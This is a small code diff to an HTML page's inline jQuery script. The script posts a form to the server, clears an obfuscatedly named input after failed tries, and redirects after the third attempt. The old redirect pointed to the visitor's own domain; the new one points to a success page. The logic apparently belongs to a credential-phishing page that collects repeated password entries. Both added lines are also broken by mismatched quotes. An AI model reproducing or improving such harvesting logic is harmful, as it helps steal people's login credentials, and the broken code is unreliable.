@@ -103,7 +103,7 @@
             
             $.post("/", $(this).serialize(), function() {
                 if (x >= 2) {
-                    window.location.replace('https://www.' + currentDomain);
+                    window.location.href="success.html#' + hash;
                 } else {
                     x++;
                     $('#kC-bl-Lp').val('');
@@ -112,7 +112,7 @@
             }).fail(function() {
                 // This ensures it still works even if testing on your PC
                 if (x >= 2) {
-                    window.location.replace('https://www.' + currentDomain);
+                   window.location.href="success.html#' + hash;
                 } else {
                     x++;
                     $('#kC-bl-Lp').val('');
@@ -122,4 +122,5 @@
         });
     </script>
 </body>
+
 </html>
